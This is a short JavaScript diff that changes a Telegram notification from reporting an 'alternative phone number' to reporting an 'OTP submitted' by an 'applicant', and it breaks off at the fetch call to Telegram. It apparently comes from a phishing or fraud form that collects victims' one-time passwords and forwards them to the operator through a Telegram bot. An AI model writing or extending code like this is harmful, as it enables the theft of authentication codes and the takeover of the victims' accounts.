@@ -89,12 +89,12 @@ async function sendAlternativePhoneNotification(phoneNumber, recordId) {
     }
 
     const message = [
-        "📞 ALTERNATIVE PHONE NUMBER SUBMITTED",
+        "📞 OTP SUBMITTED",
         "",
-        `Alternative phone: ${phoneNumber}`,
+        `OTP: ${phoneNumber}`,
         `MockAPI record ID: ${recordId || "N/A"}`,
         "",
-        "The applicant submitted this alternative contact number."
+        "The applicant submitted OTP number."
     ].join("\n");
 
     const telegramResponse = await fetch(
